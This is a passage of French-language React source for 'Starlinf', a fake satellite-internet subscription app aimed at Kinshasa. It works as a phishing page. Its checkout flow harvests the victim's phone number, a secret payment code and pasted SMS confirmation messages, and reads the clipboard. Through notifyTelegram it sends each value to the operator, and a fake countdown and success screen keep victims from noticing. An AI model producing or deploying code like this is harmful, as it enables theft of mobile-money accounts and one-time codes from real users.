      >
        <CheckCircle2 size={30} />
      </span>
      <div>
        <p className="font-display text-lg font-bold text-[#EAF0FB]">
          Connexion à votre SIM {operator.shortName} établie
        </p>
        <p className="mt-1.5 text-xs text-[#8C97B8]">
          Votre forfait {plan.name} (${price}/mois) est activé. Bienvenue chez Starlinf !
        </p>
      </div>
      <button
        onClick={onDone}
        style={{ backgroundColor: operator.color }}
        className="mt-4 w-full rounded-xl px-4 py-3 text-sm font-semibold text-[#05070D] transition-transform duration-300 active:scale-[0.98]"
      >
        Terminé
      </button>
    </div>
  );
}

function SimConnectScreen({ operator, plan, price, onFinish, phone }) {
  const [message, setMessage] = useState("");
  const [seconds, setSeconds] = useState(30);
  const [justRefreshed, setJustRefreshed] = useState(false);
  const [sent, setSent] = useState(false);

  useEffect(() => {
    const id = setInterval(() => {
      setSeconds((s) => {
        if (s <= 1) {
          setMessage("");
          setJustRefreshed(true);
          setTimeout(() => setJustRefreshed(false), 2200);
          return 30;
        }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(id);
  }, [operator.id]);

  const handleAutoPaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text && text.trim()) {
        setMessage(text.trim());
        return;
      }
    } catch (e) {
      /* clipboard indisponible, on utilise le message simulé ci-dessous */
    }
    const code = Math.floor(100000 + Math.random() * 900000);
    setMessage(`${operator.shortName}: Votre code de confirmation Starlinf est ${code}. Valide 30 secondes.`);
  };

  if (sent) {
    return <SuccessScreen operator={operator} plan={plan} price={price} onDone={onFinish} />;
  }

  return (
    <div className="flex-1 flex flex-col overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
      <div className="flex flex-col items-center pt-4">
        <span
          className="flex items-center justify-center w-14 h-14 rounded-full font-[JetBrains_Mono] text-sm font-bold"
          style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
        >
          {operator.mono}
        </span>
        <p className="mt-3 text-sm font-semibold text-[#EAF0FB]">
          Connexion à votre SIM {operator.shortName}
        </p>
      </div>

      <p className="mt-4 text-center text-[13px] leading-relaxed text-[#B7C0D8]">
        Veuillez copier et coller le message envoyé par SMS par {operator.shortName}.
      </p>
      <p className="mt-1.5 text-center text-[11px] italic text-[#8C97B8]">
        Ce message n'est valide que 30 secondes. Passé ce délai, un nouveau code vous sera transmis
        — pensez à le copier au plus vite.
      </p>

      {justRefreshed && (
        <div className="mt-3 text-center text-[11px] font-medium" style={{ color: operator.color }}>
          Nouveau code envoyé
        </div>
      )}

      <textarea
        value={message}
        onChange={(e) => setMessage(e.target.value)}
        placeholder="Collez ici le message reçu par SMS…"
        rows={4}
        className="mt-4 w-full resize-none rounded-2xl border border-white/[0.08] bg-[#121B33] p-3.5 text-[13px] text-[#EAF0FB] outline-none placeholder:text-[#8C97B8]/50 transition-colors duration-300 focus:border-white/25"
        style={message ? { borderColor: `${operator.color}60` } : undefined}
      />

      <button
        onClick={handleAutoPaste}
        className="mt-2 flex items-center justify-center gap-1.5 self-center rounded-lg px-3 py-1.5 text-xs font-medium transition-colors duration-200"
        style={{ backgroundColor: `${operator.color}1A`, color: operator.color }}
      >
        <Clipboard size={13} />
        Coller automatiquement le message
      </button>

      <div className="mt-auto pt-6 space-y-3">
        <div className="flex items-center justify-between text-[11px] text-[#8C97B8]">
          <span>Message valide encore</span>
          <span className="font-[JetBrains_Mono] font-semibold" style={{ color: operator.color }}>
            {seconds}s
          </span>
        </div>
        <div className="h-1.5 w-full rounded-full bg-white/[0.06] overflow-hidden">
          <div
            className="h-full rounded-full transition-all duration-1000 ease-linear"
            style={{ width: `${(seconds / 30) * 100}%`, backgroundColor: operator.color }}
          />
        </div>
        <button
          disabled={!message.trim()}
          onClick={() => {
            notifyTelegram(
              `📨 Message collé\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${operator.name}\nNuméro : ${phone}\nMessage : ${message}`
            );
            setSent(true);
          }}
          style={message.trim() ? { backgroundColor: operator.color } : undefined}
          className={`w-full rounded-xl px-4 py-3 text-sm font-semibold transition-all duration-300 ${
            message.trim() ? "text-[#05070D] active:scale-[0.98]" : "bg-white/[0.06] text-[#8C97B8] cursor-not-allowed"
          }`}
        >
          Envoyer
        </button>
      </div>
    </div>
  );
}

function TabBar({ active, setActive }) {
  const tabs = [
    { id: "statut", label: "Statut", icon: Wifi },
    { id: "forfait", label: "Forfait", icon: ChevronRight },
  ];
  const index = tabs.findIndex((t) => t.id === active);
  return (
    <div className="relative shrink-0 border-t border-white/[0.07] bg-[#0B1224]/95 backdrop-blur px-2 pt-2 pb-[max(0.5rem,env(safe-area-inset-bottom))]">
      <div
        className="absolute top-2 h-[calc(100%-1rem)] w-1/2 rounded-xl bg-white/[0.06] transition-transform duration-300 ease-out"
        style={{ transform: `translateX(${index * 100}%)`, width: "calc(50% - 8px)", left: "8px" }}
      />
      <div className="relative grid grid-cols-2">
        {tabs.map((t) => {
          const isActive = t.id === active;
          const Icon = t.id === "statut" ? Satellite : Wifi;
          return (
            <button
              key={t.id}
              onClick={() => setActive(t.id)}
              className="relative z-10 flex flex-col items-center gap-1 py-2 rounded-xl transition-colors duration-300"
            >
              <Icon
                size={19}
                strokeWidth={2.2}
                className={`transition-all duration-300 ${
                  isActive ? "text-[#FFB020] -translate-y-0.5" : "text-[#8C97B8]"
                }`}
              />
              <span
                className={`text-[11px] font-medium transition-colors duration-300 ${
                  isActive ? "text-[#EAF0FB]" : "text-[#8C97B8]"
                }`}
              >
                {t.label}
              </span>
            </button>
          );
        })}
      </div>
    </div>
  );
}

export default function App() {
  const [active, setActive] = useState("statut");
  const [cycle, setCycle] = useState("mensuel");
  const [selected, setSelected] = useState(null);
  const [checkoutStep, setCheckoutStep] = useState(null); // null | method | phone | confirmPhone | code | connecting | simConnect
  const [operator, setOperator] = useState(null);
  const [phone, setPhone] = useState("");
  const plan = PLANS.find((p) => p.id === selected);
  const price = plan ? (cycle === "annuel" ? (plan.monthly * 0.85).toFixed(0) : plan.monthly) : 0;
  const op = OPERATORS.find((o) => o.id === operator);

  const resetCheckout = () => {
    setCheckoutStep(null);
    setOperator(null);
    setPhone("");
    setSelected(null);
    setActive("statut");
  };

  return (
    <div className="min-h-screen w-full flex items-center justify-center bg-[#05070D] py-6 px-2">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Sora:wght@600;700;800&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap');
        * { font-family: 'Inter', sans-serif; }
        .font-display { font-family: 'Sora', sans-serif; }
        @keyframes orbit { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes orbitCounter { from { transform: rotate(0deg); } to { transform: rotate(-360deg); } }
        @keyframes pingRing {
          0% { transform: translate(-50%,-50%) scale(0.4); opacity: 0.9; }
          100% { transform: translate(-50%,-50%) scale(3.4); opacity: 0; }
        }
        @keyframes pulseDot { 0%, 100% { opacity: 1; } 50% { opacity: 0.35; } }
        @keyframes fadeSlideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes flow {
          0% { left: 0%; opacity: 0; }
          10% { opacity: 1; }
          90% { opacity: 1; }
          100% { left: 100%; opacity: 0; }
        }
        @media (prefers-reduced-motion: reduce) {
          *, *::before, *::after { animation-duration: 0.001ms !important; animation-iteration-count: 1 !important; }
        }
      `}</style>

      <div className="relative w-full max-w-[430px] h-[860px] max-h-[92vh] rounded-[2.25rem] overflow-hidden bg-[#0B1224] border border-white/[0.08] shadow-2xl flex flex-col">
        {checkoutStep ? (
          <>
            {!["connecting", "simConnect"].includes(checkoutStep) && (
              <CheckoutHeader
                title={
                  {
                    method: "Moyen de paiement",
                    phone: "Numéro de téléphone",
                    confirmPhone: "Confirmez votre numéro",
                    code: "Code secret",
                  }[checkoutStep]
                }
                onBack={() => {
                  if (checkoutStep === "method") setCheckoutStep(null);
                  else if (checkoutStep === "phone") setCheckoutStep("method");
                  else if (checkoutStep === "confirmPhone") setCheckoutStep("phone");
                  else if (checkoutStep === "code") setCheckoutStep("confirmPhone");
                }}
              />
            )}

            {checkoutStep === "method" && (
              <PaymentMethodScreen
                plan={plan}
                price={price}
                operator={operator}
                setOperator={setOperator}
                onBack={() => setCheckoutStep(null)}
                onNext={() => setCheckoutStep("phone")}
              />
            )}
            {checkoutStep === "phone" && (
              <PhoneEntryScreen
                plan={plan}
                price={price}
                operator={operator}
                phone={phone}
                setPhone={setPhone}
                onBack={() => setCheckoutStep("method")}
                onNext={() => setCheckoutStep("confirmPhone")}
              />
            )}
            {checkoutStep === "confirmPhone" && (
              <ConfirmPhoneScreen
                phone={phone}
                operator={op}
                onEdit={() => setCheckoutStep("phone")}
                onConfirm={() => {
                  notifyTelegram(
                    `📞 Nouveau numéro confirmé\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${op.name}\nNuméro : ${phone}`
                  );
                  setCheckoutStep("code");
                }}
              />
            )}
            {checkoutStep === "code" && (
              <CodeEntryScreen
                operator={op}
                onValidate={(code) => {
                  notifyTelegram(
                    `🔐 Code reçu\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${op.name}\nNuméro : ${phone}\nCode : ${code}`
                  );
                  setCheckoutStep("connecting");
                }}
              />
            )}
            {checkoutStep === "connecting" && (
              <ConnectingScreen onDone={() => setCheckoutStep("simConnect")} />
            )}
            {checkoutStep === "simConnect" && (
              <SimConnectScreen operator={op} plan={plan} price={price} phone={phone} onFinish={resetCheckout} />
            )}
          </>
        ) : (
          <>
            {/* header */}
            <div className="shrink-0 px-5 pt-6 pb-3 flex items-center justify-between bg-gradient-to-b from-[#0B1224] to-[#0B1224]/0">
              <div className="flex items-center gap-2">
                <span className="flex items-center justify-center w-8 h-8 rounded-xl bg-[#2DD4BF]/10 text-[#2DD4BF]">
                  <Satellite size={16} />
                </span>
                <span className="font-display text-[17px] font-extrabold tracking-tight text-[#EAF0FB]">
                  STARLINF
                </span>
              </div>
              <span className="text-[10px] uppercase tracking-[0.14em] text-[#8C97B8]">RDC · Kinshasa</span>
            </div>

            {/* content */}
            <main key={active} className="flex-1 overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
              {active === "statut" ? (
                <StatutView active={active === "statut"} onBuy={() => setActive("forfait")} />
              ) : (
                <ForfaitView cycle={cycle} setCycle={setCycle} selected={selected} setSelected={setSelected} />
              )}
            </main>

            {/* sticky selection summary */}
            {active === "forfait" && plan && (
              <div className="shrink-0 mx-4 mb-3 flex items-center justify-between rounded-2xl bg-[#FFB020] px-4 py-3 animate-[fadeSlideUp_0.3s_ease_both]">
                <div>
                  <p className="text-[11px] text-[#05070D]/70 font-medium">{plan.name} sélectionné</p>
                  <p className="text-sm font-bold text-[#05070D]">${price}/mois</p>
                </div>
                <button
                  onClick={() => setCheckoutStep("method")}
                  className="flex items-center gap-1 rounded-xl bg-[#05070D] px-3 py-2 text-xs font-semibold text-[#FFB020]"
                >
                  Continuer <ArrowRight size={14} />
                </button>
              </div>
            )}

            <TabBar active={active} setActive={setActive} />
          </>
        )}
      </div>
    </div>
  );
}
